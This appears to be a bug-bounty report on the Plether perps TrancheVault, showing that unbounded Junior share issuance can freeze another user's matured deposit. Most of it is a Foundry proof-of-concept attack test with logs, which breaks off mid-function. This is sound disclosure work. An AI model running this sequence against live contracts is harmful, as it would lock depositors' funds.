# \#99753 [SC-High] Unbounded Junior share issuance freezes matured LP deposits for over 24 hours

**Submitted on Nov 15th 2026 at 05:37:41 UTC by @unineko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99753
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Summary

**Severity: High — temporary freezing of user funds for more than 24 hours under the [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/).** Repeated public Junior deposits against coupon-depleted, positive Junior principal can bring the Junior share supply close enough to `uint256.max` that subsequent deposit shares cannot be minted. In the standalone Foundry PoC, an unrelated user's **25,000 USDG** remains in Vault escrow, unclaimable and uncancellable **90,030 seconds after maturity**, while Junior NAV stays positive. The victim cannot restore settlement or cancel its mature request through any ordinary call. The public-call setup uses release tranche parameters; its duration and practical conditions are described below.

## Finding Description

At the frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, [HousePoolWaterfallAccountingLib.paySeniorCoupon()](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L37-L91) moves principal from Junior to Senior without burning Junior shares. For zero-fee Junior entries, [TrancheVault.quoteDepositFromState()](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410) calculates `floor(depositAssets × (existingShares + 1,000) / (pricingAssets + 1))`. A small positive Junior principal therefore permits very large share issuance. The release has one-USDG seeds in each tranche, an 8% Senior coupon, a 40-million-USDG and 80% Senior limit, and a one-USDG minimum LP request ([release parameters](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L128-L156); [Pool defaults and minimum](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L176-L256)).

[HousePool._settleDepositPhase()](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1098) accepts a positive quote without checking whether `totalSupply + shares` fits in `uint256`. [TrancheVault.finalizeDepositEpochFromPool()](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1445-L1475) transfers the queued USDG to the Pool and calls `_mint()`. OpenZeppelin's [ERC20._update()](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcbae5394ae8ad52d8e580a3477db99814b9d565/contracts/token/ERC20/ERC20.sol#L176-L180) panics when the supply addition overflows; the transaction then rolls back the token transfer, coupon checkpoint, and queue finalization. The mature head remains neither finalized nor rejected. [TrancheVault.cancelPendingDeposit()](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L832-L874) blocks ordinary Junior cancellation when the epoch is mature and unrejected, projected Junior NAV remains positive, and Senior is not impaired. Pausing Pool entry or LP epoch settlement does not itself open the Junior cancellation path.

The PoC uses public LP requests and settlements after fixture bootstrap with the release tranche parameters:

1. The attacker funds Senior and Junior, then settles and claims a one-USDG Junior deposit at each of **52 checkpoints spaced 28 days apart**. It then makes 27 weekly Junior recapitalizations at positive projected Junior principal of roughly 9,000–11,000 token atoms, with a 0.05-USDG buffer on the last recap. Weekly settlements vary by 0, 30, and 60 seconds. No position or Router price mark is required for direct public Pool settlement in this no-position state.
2. In the last successful epoch, the attacker requests a Senior redemption and a bounded Junior deposit, settling 60 seconds after the scheduled start. Senior redemption is funded first; the attacker claims **1,434.585232 USDG** while Junior supply reaches `115677590965580321229496006801326612151366528043756642991068490584300075214512` raw shares.
3. The attacker claims all earlier deposit shares before queuing the next one-USDG Junior head, leaving `depositClaimEscrowShares == 0`. Its share quote is finite at `22202741075596326496397834804044754992480224896446785533727831217324040901554`, exceeding the remaining supply headroom of `114498271735874194074978207361295701903456621883921048389093423613054425423`. The settlement panics at the ERC-20 mint and leaves this attacker-owned request pending.
4. Only afterward does an unrelated user request a 25,000-USDG Junior deposit in a later epoch. The earlier head remains first in the queue. At 30 seconds and again 90,030 seconds after the victim's maturity, settlement still reverts; the victim's request remains pending, its claimable and refundable amounts remain zero, and claim and cancellation revert. The Vault retains **25,001 USDG** in total escrow, including the attacker's one-USDG head. **At this saturated supply, the victim's own 25,000-USDG quote also exceeds `uint256`; its request would fail without the attacker-owned head.** The PoC now checks that victim-only counterfactual from the same post-amplification snapshot and at the same victim request time. The finite one-USDG head isolates the separate checked ERC-20 `_mint()` addition overflow. Both failure sites stem from issuance without a bound or a mature-request recovery path; they are one finding, not two losses.

The five-minute epoch cutoff also admits a deposit **before** the last near-limit mint while assigning it to the following epoch: a separate one-USDG victim can request at `E−4 minutes`, when its current share quote is finite and below the remaining supply headroom; the attacker finalizes its already queued mint at `E+60 seconds`; the victim's `E+1` settlement then fails through maturity +90,030 seconds. A matched control preserves the Senior redemption and victim timing but cancels only the attacker's final Junior mint; the victim's one USDG then becomes claimable, isolating that mint as the cause of the freeze. This supplementary sequence demonstrates that a request can become unserviceable **after** admission and an initially valid quote. It does not claim that the 25,000-USDG request in step 4 had a valid pre-saturation quote.

This is distinct from the precontest [Cecuro LOW-13](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=97) per-controller rounding and dust burn after a *successful* epoch mint. Here the aggregate mint itself fails before finalization; no controller's claim is consumed or dust burned. [LOW-72](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=213) concerns an indicative quote at zero Junior principal with a refund route; this PoC keeps positive principal. [MED-24](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=56) concerns bounded work in the redemption queue, not a deposit mint rollback.

## Impact Explanation

The unrelated user's **25,000 USDG** remains in Vault escrow for at least **25 hours and 30 seconds after maturity** in the tested state, above the [competition's 24-hour temporary-freeze impact threshold](https://immunefi.com/audit-competition/plether/scope/). At both checkpoints, the victim has no claimable or refundable deposit, cannot claim or cancel, and has received no USDG back. This is a freeze of accessible principal for the demonstrated period, **not 25,000 USDG of established economic damage**. The earlier one-USDG head is the first observed failure in the main branch but is not necessary for this large victim's failure: the victim-only branch also panics at quote calculation. A Pool pause or LP settlement hold does not unlock this mature Junior request. Holder-authorized redemptions could free supply headroom in some states, and a future projected Junior NAV wipe or Senior impairment could permit cancellation. The victim, holding only pending USDG, cannot force another holder's redemption or those state changes. None occurs during the demonstrated interval.

## Likelihood Explanation

After fixture bootstrap, every request, settlement, claim, and redemption in this PoC follows a public user or keeper path. The LP-only sequence uses no trading loss or oracle price input. It uses the release's one-USDG seeds, 8% coupon, and 40-million-USDG/80% Senior limits. The 52 successful 28-day coupon checkpoints show that the issue persists through regular accounting updates; 27 weekly recaps with 0/30/60-second settlement offsets build the near-limit supply without an exact one-atom pricing state. The controlled timeline spans approximately **4.545 simulated years**. The fixture uses a six-decimal, public-mint-only ERC-20 with the release testnet MockUSDG callable surface and confirms that arbitrary `burn(address,uint256)` is unavailable. In the 25,000-USDG branch the victim requests after saturation, so an optional `estimateDepositShares(25,000e6)` call would already revert; the contract itself accepts the request and advertises `maxRequestDeposit == uint256.max`. The separate pre-saturation one-USDG sequence shows that a currently valid quote does not guarantee settlement at maturity.

The attacker funds **1,440.232295 nominal mock USDG** across the construction and failing head, then claims **1,434.585232 USDG** from Senior before the victim arrives. The **5.647063-USDG** difference is funding not yet recovered: the attacker retains Junior shares and its pending one-USDG request, so this is not a net-cost or profit calculation. The permitted mock token and simulated clock do not measure real collateral availability, gas and capital carrying cost over the 4.545-year sequence, or competing LP activity. Those execution conditions matter to likelihood and reward assessment, while the competition's [impact-before-feasibility guidance](https://immunefi.com/audit-competition/plether/scope/) preserves the demonstrated 25-hour freeze as a **High impact category**.

## Recommendation

Consider bounding the proposed share quotient without reverting and checking the remaining ERC-20 supply headroom **before** moving escrowed cash or minting shares. If either bound fails, reject the epoch and let each controller recover its full deposit; provide a recovery path for a mature head that is already unserviceable. A request-time limit can reduce exposure, but a settlement-time check remains necessary because coupon, Pool NAV, and share supply may change between request and maturity. Keep the per-controller rounding policy addressed by LOW-13 separate from this aggregate mint overflow.


## Proof of Concept

## Proof of Concept

The runnable single-file test is `packages/perps/test/perps/finding8_poc.t.sol`; its Solidity source is supplied separately and is not reproduced here. It uses unmodified in-scope contracts at the frozen commit, the repository's Foundry fixture with release tranche parameters, and a public-mint-only six-decimal token with the testnet MockUSDG callable surface. It checks the 25,000-USDG lock in the head-present and victim-only states and a pre-saturation one-USDG request whose initial quote fits then-current supply headroom but whose later settlement overflows. From `packages/perps`, run:

```sh
forge test --match-path test/perps/finding8_poc.t.sol -vv
```

Selected output from a passing run (USDG amounts are six-decimal token atoms):

```text
Ran 1 test for test/perps/finding8_poc.t.sol:Finding8ContestPoCTest
[PASS] test_Finding8_SaturatedJuniorSupplyBlocksIndependentDepositorForMoreThan24Hours()
Logs:
  F8 periodic four-week checkpoint count 52
  F8 attacker gross funded atoms 1440232295
  F8 attacker Senior recovered atoms 1434585232
  F8 attacker gross less Senior cash atoms 5647063
  F8 residual Senior/Junior principal atoms 1436992 5210071
  F8 Junior share supply 115677590965580321229496006801326612151366528043756642991068490584300075214512
  F8 blocker finite share quote 22202741075596326496397834804044754992480224896446785533727831217324040901554
  F8 remaining share headroom 114498271735874194074978207361295701903456621883921048389093423613054425423
  F8 no-final-mint victim claimable atoms 1000000
  F8 pre-mint one-USDG victim quote 21804405055789659966762151307805717930794765941601110958678313890288160940221
  F8 pre-mint supply headroom 114464746079544999873094339047825234774232853288945596409848041649841837843699
  F8 early victim locked seconds after maturity 90030
  F8 victim escrow atoms 25000000000
  F8 victim-alone quote overflow at same saturated supply true
  F8 victim locked seconds after maturity 90030
  F8 simulated setup elapsed seconds 143323200
Suite result: ok. 1 passed; 0 failed; 0 skipped.
```

The test's gas (if displayed by Foundry) is **whole-test** gas, including the simulated multiyear setup, not attacker expenditure. The assertions also check a victim-only quote-overflow and settlement-failure branch from the same saturated supply and request time; a successful pre-maturity victim cancellation control in the head-present branch; the token's absence of public burn; the finite one-USDG blocker quote; repeated `Panic(0x11)` settlement failures; unchanged Pool cash and attacker wallet across those failures; exact Vault escrow; and unavailable victim claim, refund, and cancellation at both checkpoints. The added pre-saturation branch tests the same mature-rights checks after a victim request whose initial quote fit supply headroom.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Exact callable token surface of the release's MockUSDG in
///      script/DeployPerpsArbitrumSepolia.s.sol:733-748; no arbitrary burn.
contract Finding8ContestMockUSDG is ERC20 {

    constructor() ERC20("Mock USDG", "USDG") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(
        address to,
        uint256 amount
    ) external {
        _mint(to, amount);
    }

}

/// @notice Standalone contest witness: saturated Junior issuance strands a later depositor.
/// @dev Only the bootstrap owner sets the release parameters. All later Pool/Vault calls are public.
///      The settlement-token runtime is replaced with the release MockUSDG runtime
///      after fixture bootstrap, preserving ERC-20 balances and approvals but removing
///      the test-only arbitrary burn. No open positions or Router mark are used.
contract Finding8ContestPoCTest is BasePerpTest {

    uint256 private constant YEAR = 365 days;
    uint256 private constant RATE_BPS = 800;
    uint256 private constant COUPON_DENOMINATOR = 10_000 * YEAR;
    uint256 private constant TARGET_NAV_ATOMS = 10_000;
    uint256 private constant RECAP_COUNT = 27;
    uint256 private constant FINAL_RECAP_BUFFER = 50_000;
    uint256 private constant CHECKPOINT_PERIOD = 28 days;
    uint256 private constant CHECKPOINT_DEPOSIT = 1e6;
    uint256 private constant INITIAL_JUNIOR_ASSETS = 260e6;
    uint256 private constant INITIAL_SENIOR_ASSETS = 999e6;
    address private constant ATTACKER = address(0xA717);
    address private constant VICTIM = address(0xB717);

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        Finding8ContestMockUSDG releaseMock = new Finding8ContestMockUSDG();
        vm.etch(address(settlementToken), address(releaseMock).code);
        assertEq(settlementToken.decimals(), 6);
        assertEq(settlementToken.balanceOf(address(pool)), 2e6);
        (bool burnSucceeded,) =
            address(settlementToken).call(abi.encodeWithSignature("burn(address,uint256)", address(pool), 1));
        assertFalse(burnSucceeded, "release MockUSDG must have no public burn");
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(juniorVault.seedShareFloor(), 1e9);
        assertEq(seniorVault.seedShareFloor(), 1e9);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(pool.seniorRateBps(), RATE_BPS);
    }

    function _coupon(
        uint256 seniorAssets,
        uint256 elapsed
    ) private pure returns (uint256) {
        return seniorAssets * RATE_BPS * elapsed / COUPON_DENOMINATOR;
    }

    function _request(
        TrancheVault vault,
        address account,
        uint256 amount
    ) private returns (uint256 epoch) {
        settlementToken.mint(account, amount);
        vm.startPrank(account);
        settlementToken.approve(address(vault), amount);
        epoch = vault.requestDeposit(amount, account, account);
        vm.stopPrank();
    }

    function _settle() private {
        vm.prank(ATTACKER);
        pool.settleLpEpoch(0, 0);
    }

    function _fund(
        TrancheVault vault,
        uint256 amount
    ) private {
        uint256 epoch = _request(vault, ATTACKER, amount);
        vm.warp(vault.depositEpochStart(epoch));
        _settle();
        vm.prank(ATTACKER);
        assertGt(vault.claimDeposit(epoch, amount, ATTACKER, ATTACKER), 0);
    }

    function _nextMonday00After(
        uint256 timestamp
    ) private pure returns (uint256 target) {
        uint256 day = timestamp / 1 days;
        uint256 weekday = (day + 4) % 7; // Sunday = 0, Monday = 1.
        uint256 daysUntilMonday = (8 - weekday) % 7;
        target = (day + daysUntilMonday) * 1 days;
        if (target <= timestamp) {
            target += 7 days;
        }
    }

    function _projectSeniorAtTarget(
        uint256 initialSenior,
        uint256 start,
        uint256 target
    ) private pure returns (uint256 projectedSenior, uint256 count) {
        projectedSenior = initialSenior;
        uint256 prior = start;
        for (uint256 next = start + CHECKPOINT_PERIOD; next < target; next += CHECKPOINT_PERIOD) {
            projectedSenior += _coupon(projectedSenior, next - prior);
            prior = next;
            ++count;
        }
        projectedSenior += _coupon(projectedSenior, target - prior);
    }

    function _checkpointEveryFourWeeks(
        uint256 start,
        uint256 target
    ) private returns (uint256 count) {
        for (uint256 checkpoint = start + CHECKPOINT_PERIOD; checkpoint < target; checkpoint += CHECKPOINT_PERIOD) {
            vm.warp(checkpoint - 10 minutes);
            uint256 epoch = _request(juniorVault, ATTACKER, CHECKPOINT_DEPOSIT);
            vm.warp(checkpoint);
            _settle();
            assertEq(pool.lastSeniorCouponCheckpointTime(), checkpoint, "periodic coupon checkpoint");
            vm.prank(ATTACKER);
            assertGt(juniorVault.claimDeposit(epoch, CHECKPOINT_DEPOSIT, ATTACKER, ATTACKER), 0);
            assertGt(pool.juniorPrincipal(), 0, "periodic coupon depleted Junior before target");
            ++count;
        }
    }

    function _prepareBufferedNav() private returns (uint256 target, uint256 initialFunding) {
        _fund(juniorVault, INITIAL_JUNIOR_ASSETS);
        _fund(seniorVault, INITIAL_SENIOR_ASSETS);
        assertGe(pool.seniorPrincipal(), 1000e6);
        assertGe(pool.juniorPrincipal(), 250e6);

        (uint256 topupEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 topupActivation = juniorVault.depositEpochStart(topupEpoch);
        uint256 seniorBefore = pool.seniorPrincipal();
        uint256 juniorBefore = pool.juniorPrincipal();
        uint256 dueAtTopup = _coupon(seniorBefore, topupActivation - pool.lastSeniorCouponCheckpointTime());
        uint256 juniorAfterCoupon = juniorBefore - dueAtTopup;
        uint256 seniorAfterCoupon = seniorBefore + dueAtTopup;
        target = _nextMonday00After(topupActivation + 4 * YEAR);
        (uint256 seniorAtTarget, uint256 expectedCount) =
            _projectSeniorAtTarget(seniorAfterCoupon, topupActivation, target);
        uint256 couponGrowth = seniorAtTarget - seniorAfterCoupon;
        assertGt(couponGrowth + TARGET_NAV_ATOMS, juniorAfterCoupon + expectedCount * CHECKPOINT_DEPOSIT);
        uint256 topup = couponGrowth + TARGET_NAV_ATOMS - juniorAfterCoupon - expectedCount * CHECKPOINT_DEPOSIT;
        assertGe(topup, 1e6);
        assertEq(_request(juniorVault, ATTACKER, topup), topupEpoch);
        vm.warp(topupActivation);
        _settle();
        vm.prank(ATTACKER);
        assertGt(juniorVault.claimDeposit(topupEpoch, topup, ATTACKER, ATTACKER), 0);
        assertEq(pool.seniorPrincipal(), seniorAfterCoupon);
        assertEq(pool.juniorPrincipal(), juniorAfterCoupon + topup);
        initialFunding = INITIAL_JUNIOR_ASSETS + INITIAL_SENIOR_ASSETS + topup + expectedCount * CHECKPOINT_DEPOSIT;
        uint256 count = _checkpointEveryFourWeeks(topupActivation, target);
        assertEq(count, expectedCount);
        assertGe(count, 50, "periodic checkpoint coverage");
        uint256 finalCoupon = _coupon(pool.seniorPrincipal(), target - pool.lastSeniorCouponCheckpointTime());
        assertEq(pool.seniorPrincipal() + finalCoupon, seniorAtTarget, "periodic Senior projection");
        assertEq(pool.juniorPrincipal() - finalCoupon, TARGET_NAV_ATOMS, "periodic Junior projection");
        console2.log("F8 timing initial funding atoms", initialFunding);
        console2.log("F8 periodic four-week checkpoint count", count);
        console2.log("F8 initial coupon span seconds", target - topupActivation);
    }

    function _amplifyAtWeeklyLiveEpochs(
        uint256 target
    ) private returns (uint256 totalFunding, uint256 nextActivation) {
        nextActivation = target;
        for (uint256 i; i < RECAP_COUNT; ++i) {
            vm.warp(nextActivation - 10 minutes);
            assertFalse(engine.isOracleFrozen());
            uint256 futureCoupon =
                _coupon(pool.seniorPrincipal(), nextActivation - pool.lastSeniorCouponCheckpointTime());
            uint256 futureSenior = pool.seniorPrincipal() + futureCoupon;
            uint256 amount = _coupon(futureSenior, 7 days);
            if (i == RECAP_COUNT - 1) {
                amount += FINAL_RECAP_BUFFER;
            }
            assertGe(amount, 1e6);
            uint256 epoch = _request(juniorVault, ATTACKER, amount);
            assertEq(epoch, nextActivation / 1 hours);
            // Deliberately vary inclusion latency. The next request is sized
            // from the public state after the previous actual settlement.
            uint256 recapDrift = (i % 3) * 30 seconds;
            vm.warp(nextActivation + recapDrift);
            (, uint256 projectedJunior) = pool.getPendingDepositTrancheState();
            assertGe(projectedJunior, 9000, "pricing NAV below timing buffer");
            assertLe(projectedJunior, 11_000, "pricing NAV above timing buffer");
            _settle();
            vm.prank(ATTACKER);
            assertGt(juniorVault.claimDeposit(epoch, amount, ATTACKER, ATTACKER), 0);
            assertEq(pool.juniorPrincipal(), amount + projectedJunior);
            totalFunding += amount;
            nextActivation += 7 days;
        }
    }

    function _assertVictimLocked(
        uint256 victimEpoch,
        uint256 victimAssets,
        uint256 expectedEscrow
    ) private {
        assertEq(settlementToken.balanceOf(address(juniorVault)), expectedEscrow);
        assertEq(juniorVault.pendingDepositRequest(victimEpoch, VICTIM), victimAssets);
        assertEq(juniorVault.claimableDepositRequest(victimEpoch, VICTIM), 0);
        assertEq(juniorVault.refundableDepositRequest(victimEpoch, VICTIM), 0);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochNotFinalized.selector);
        juniorVault.claimDeposit(victimEpoch, victimAssets, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimEpoch, VICTIM, VICTIM);
        assertEq(settlementToken.balanceOf(VICTIM), 0);
    }

    function test_Finding8_SaturatedJuniorSupplyBlocksIndependentDepositorForMoreThan24Hours() public {
        (uint256 target, uint256 initialFunding) = _prepareBufferedNav();
        (uint256 amplificationFunding, uint256 finalActivation) = _amplifyAtWeeklyLiveEpochs(target);

        // The final amount is sized for a 60-second inclusion offset;
        // every preceding weekly recap has 0/30/60-second drift.
        vm.warp(finalActivation - 10 minutes);
        assertFalse(engine.isOracleFrozen());
        uint256 priorSupply = juniorVault.accruedTotalSupply();
        uint256 latePricingAssets = pool.juniorPrincipal()
            - _coupon(pool.seniorPrincipal(), finalActivation + 60 seconds - pool.lastSeniorCouponCheckpointTime());
        assertGe(latePricingAssets, 50_000);
        uint256 latestSafeDeposit = Math.mulDiv(
            type(uint256).max - priorSupply + 1, latePricingAssets + 1, priorSupply + 1000, Math.Rounding.Ceil
        ) - 1;
        uint256 finalJuniorDeposit = latestSafeDeposit * 999 / 1000;
        assertGe(finalJuniorDeposit, 1e6);

        // Senior funding is released before the final safe Junior mint in the same LP epoch.
        uint256 seniorShares = seniorVault.maxRequestRedeem(ATTACKER);
        vm.prank(ATTACKER);
        uint256 seniorEpoch = seniorVault.requestRedeem(seniorShares, ATTACKER, ATTACKER);
        uint256 finalJuniorEpoch = _request(juniorVault, ATTACKER, finalJuniorDeposit);
        assertEq(seniorEpoch, finalJuniorEpoch);
        assertEq(finalJuniorEpoch, finalActivation / 1 hours);

        // Matched control: keep Senior redemption and the victim's E+1
        // request timing, but remove only the final attacker Junior mint.
        uint256 beforeNoFinalMint = vm.snapshotState();
        vm.warp(finalActivation - 4 minutes);
        vm.prank(ATTACKER);
        assertEq(juniorVault.cancelPendingDeposit(finalJuniorEpoch, ATTACKER, ATTACKER), finalJuniorDeposit);
        uint256 controlVictimEpoch = _request(juniorVault, VICTIM, 1e6);
        assertEq(controlVictimEpoch, finalJuniorEpoch + 1);
        vm.warp(finalActivation + 60 seconds);
        _settle();
        vm.warp(juniorVault.depositEpochStart(controlVictimEpoch) + 30 seconds);
        _settle();
        uint256 controlClaimable = juniorVault.claimableDepositRequest(controlVictimEpoch, VICTIM);
        assertEq(controlClaimable, 1e6, "victim activates without final attacker mint");
        console2.log("F8 no-final-mint victim claimable atoms", controlClaimable);
        assertTrue(vm.revertToState(beforeNoFinalMint));

        // A user can enter before the final supply jump with a valid share
        // estimate. The five-minute cutoff places that request in the next
        // epoch, so the attacker's already queued mint executes first.
        uint256 beforeEarlyVictim = vm.snapshotState();
        vm.warp(finalActivation - 4 minutes);
        uint256 earlyVictimAssets = 1e6;
        uint256 preMintQuote = juniorVault.estimateDepositShares(earlyVictimAssets);
        uint256 preMintHeadroom = type(uint256).max - juniorVault.totalSupply();
        assertGt(preMintQuote, 0, "pre-mint victim quote is positive");
        assertLe(preMintQuote, preMintHeadroom, "pre-mint victim quote fits supply");
        uint256 earlyVictimEpoch = _request(juniorVault, VICTIM, earlyVictimAssets);
        assertEq(earlyVictimEpoch, finalJuniorEpoch + 1, "victim request matures after final mint");
        vm.warp(finalActivation + 60 seconds);
        _settle();
        uint256 earlyVictimMaturity = juniorVault.depositEpochStart(earlyVictimEpoch);
        vm.warp(earlyVictimMaturity + 30 seconds);
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        _assertVictimLocked(earlyVictimEpoch, earlyVictimAssets, earlyVictimAssets);
        vm.warp(earlyVictimMaturity + 25 hours + 30 seconds);
        assertGt(juniorVault.totalAssets(), 0, "Junior NAV remains positive");
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        _assertVictimLocked(earlyVictimEpoch, earlyVictimAssets, earlyVictimAssets);
        console2.log("F8 pre-mint one-USDG victim quote", preMintQuote);
        console2.log("F8 pre-mint supply headroom", preMintHeadroom);
        console2.log("F8 early victim locked seconds after maturity", block.timestamp - earlyVictimMaturity);
        assertTrue(vm.revertToState(beforeEarlyVictim));

        vm.warp(finalActivation + 60 seconds);
        (, uint256 finalPricingAssets) = pool.getPendingDepositTrancheState();
        assertGe(finalPricingAssets, latePricingAssets);
        assertLe(finalPricingAssets, 70_000);
        _settle();
        vm.prank(ATTACKER);
        uint256 seniorRecovered = seniorVault.claimRedeem(seniorEpoch, seniorShares, ATTACKER, ATTACKER);
        assertGt(seniorRecovered, 1000e6);
        vm.prank(ATTACKER);
        assertGt(juniorVault.claimDeposit(finalJuniorEpoch, finalJuniorDeposit, ATTACKER, ATTACKER), 0);
        assertEq(juniorVault.depositClaimEscrowShares(), 0);
        assertLt(pool.seniorPrincipal(), 2e6);
        uint256 nearMaxSupply = juniorVault.totalSupply();
        assertGt(nearMaxSupply, priorSupply);
        assertLt(nearMaxSupply, type(uint256).max);
        uint256 attackerJuniorShares = juniorVault.balanceOf(ATTACKER);
        uint256 attackerJuniorQuote = juniorVault.convertToAssets(attackerJuniorShares);

        // Counterfactual: from the same saturated supply, queue only the
        // unrelated user's 25,000-USDG request at the same time as below.
        // Its own quote exceeds uint256; the attacker's 1-USDG head is not
        // a necessary cause of this user's failure in this particular state.
        uint256 beforeBlocker = vm.snapshotState();
        uint256 blockerActivation = finalActivation + 1 hours;
        vm.warp(blockerActivation + 10 minutes);
        uint256 victimAssets = 25_000e6;
        assertEq(
            juniorVault.maxRequestDeposit(VICTIM), type(uint256).max, "saturated vault still admits Junior deposits"
        );
        uint256 victimOnlyEpoch = _request(juniorVault, VICTIM, victimAssets);
        assertEq(juniorVault.totalSupply(), nearMaxSupply, "victim-only branch changed supply");
        uint256 victimOnlyMaturity = juniorVault.depositEpochStart(victimOnlyEpoch);
        vm.warp(victimOnlyMaturity + 30 seconds);
        (, uint256 victimOnlyPricingAssets) = pool.getPendingDepositTrancheState();
        assertGt(victimOnlyPricingAssets, 0);
        uint256 victimOnlySupply = juniorVault.accruedTotalSupply();
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        juniorVault.quoteDepositFromState(victimAssets, victimOnlyPricingAssets, victimOnlySupply, 0);
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        _assertVictimLocked(victimOnlyEpoch, victimAssets, victimAssets);
        vm.warp(victimOnlyMaturity + 25 hours + 30 seconds);
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        _assertVictimLocked(victimOnlyEpoch, victimAssets, victimAssets);
        assertTrue(vm.revertToState(beforeBlocker));

        // Independently, the attacker's minimum request has a finite quote
        // that fails later at ERC-20 total-supply addition instead.
        vm.warp(blockerActivation - 10 minutes);
        assertFalse(engine.isOracleFrozen());
        uint256 blockerEpoch = _request(juniorVault, ATTACKER, 1e6);
        assertEq(blockerEpoch, blockerActivation / 1 hours);
        uint256 attackerWalletAfterRecovery = settlementToken.balanceOf(ATTACKER);
        assertEq(attackerWalletAfterRecovery, seniorRecovered);
        vm.warp(blockerActivation + 30 seconds);
        (, uint256 blockerPricingAssets) = pool.getPendingDepositTrancheState();
        assertGt(blockerPricingAssets, 0);
        uint256 blockerQuote =
            juniorVault.quoteDepositFromState(1e6, blockerPricingAssets, juniorVault.accruedTotalSupply(), 0);
        uint256 headroom = type(uint256).max - nearMaxSupply;
        assertGt(blockerQuote, headroom, "finite blocker quote must exceed mint headroom");
        uint256 poolCashBeforeFailure = settlementToken.balanceOf(address(pool));
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        assertEq(settlementToken.balanceOf(address(pool)), poolCashBeforeFailure);
        assertEq(settlementToken.balanceOf(address(juniorVault)), 1e6);
        assertEq(juniorVault.pendingDepositRequest(blockerEpoch, ATTACKER), 1e6);

        // A separate user arrives after the attacker's head has failed.
        vm.warp(blockerActivation + 10 minutes);
        assertEq(juniorVault.maxRequestDeposit(VICTIM), type(uint256).max, "blocked head does not close deposits");
        uint256 victimEpoch = _request(juniorVault, VICTIM, victimAssets);
        assertEq(victimEpoch, victimOnlyEpoch, "counterfactual victim epoch differs");
        assertGt(victimEpoch, blockerEpoch);
        uint256 escrowAssets = victimAssets + 1e6;
        assertEq(settlementToken.balanceOf(address(juniorVault)), escrowAssets);
        uint256 snapshot = vm.snapshotState();
        vm.prank(VICTIM);
        assertEq(juniorVault.cancelPendingDeposit(victimEpoch, VICTIM, VICTIM), victimAssets);
        assertEq(settlementToken.balanceOf(VICTIM), victimAssets);
        assertTrue(vm.revertToState(snapshot));

        uint256 victimMaturity = juniorVault.depositEpochStart(victimEpoch);
        vm.warp(victimMaturity + 30 seconds);
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        _assertVictimLocked(victimEpoch, victimAssets, escrowAssets);
        assertEq(settlementToken.balanceOf(address(pool)), poolCashBeforeFailure);
